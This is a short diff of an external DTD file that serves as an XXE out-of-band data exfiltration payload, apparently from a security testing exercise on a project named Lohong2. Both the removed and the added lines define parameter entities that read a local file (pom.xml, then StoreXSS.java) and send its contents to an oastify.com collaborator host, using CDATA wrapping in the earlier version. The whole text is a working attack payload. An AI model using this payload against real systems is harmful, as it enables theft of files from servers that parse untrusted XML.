@@ -1,6 +1,3 @@
-<!ENTITY % file SYSTEM "file:///C:/Users/Admin/IdeaProjects/Lohong2/pom.xml">
-<!ENTITY % start "<![CDATA[">
-<!ENTITY % end "]]>">
-<!ENTITY % conclude "%start;%file;%end;">
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://ozr8f3oam4scukooysojpr94xv3nref3.oastify.com/?content=%conclude;'>">
+<!ENTITY % file SYSTEM "file:///C:\Users\Admin\IdeaProjects\Lohong2\src\main\java\com\example\lohong2\StoreXSS.java">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://udbl1no3n9t8kfvratnyg9exioofc60v.oastify.com/aaa?%file;'>">
 %all;
